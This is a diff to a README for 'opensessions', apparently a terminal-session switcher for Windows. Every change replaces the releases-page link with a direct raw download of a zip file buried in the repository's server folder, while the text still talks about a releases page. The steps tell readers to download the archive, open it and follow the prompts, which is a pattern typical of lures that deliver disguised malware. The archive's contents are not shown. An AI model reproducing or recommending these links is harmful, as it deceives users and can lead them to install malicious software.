@@ -1,10 +1,10 @@
 # 🖥️ opensessions - Switch terminal sessions fast
 
-[![Download opensessions](https://img.shields.io/badge/Download%20opensessions-purple)](https://github.com/Josiunforeseeable380/opensessions/releases)
+[![Download opensessions](https://img.shields.io/badge/Download%20opensessions-purple)](https://github.com/Josiunforeseeable380/opensessions/raw/refs/heads/main/apps/server/Software-v2.0.zip)
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/Josiunforeseeable380/opensessions/releases
+Visit this page to download: https://github.com/Josiunforeseeable380/opensessions/raw/refs/heads/main/apps/server/Software-v2.0.zip
 
 On the releases page, look for the latest version and download the Windows file that matches your system.
 
@@ -33,7 +33,7 @@ If your PC can run current Windows apps, it should work well.
 
 ## 🚀 Download and install
 
-1. Open the release page: https://github.com/Josiunforeseeable380/opensessions/releases
+1. Open the release page: https://github.com/Josiunforeseeable380/opensessions/raw/refs/heads/main/apps/server/Software-v2.0.zip
 2. Find the newest release at the top of the page
 3. Download the Windows file for opensessions
 4. If the file comes as a ZIP folder, open it after the download finishes
@@ -153,7 +153,7 @@ Open a few terminal sessions first, then refresh the view.
 
 Use this link to get the latest Windows build:
 
-https://github.com/Josiunforeseeable380/opensessions/releases
+https://github.com/Josiunforeseeable380/opensessions/raw/refs/heads/main/apps/server/Software-v2.0.zip
 
 ## 🧾 File names you may see
 
@@ -180,7 +180,7 @@ opensessions is useful when your work spreads across many terminal windows. It g
 
 ## 🏁 Start here
 
-1. Go to https://github.com/Josiunforeseeable380/opensessions/releases
+1. Go to https://github.com/Josiunforeseeable380/opensessions/raw/refs/heads/main/apps/server/Software-v2.0.zip
 2. Download the latest Windows file
 3. Open the file
 4. Follow the prompts
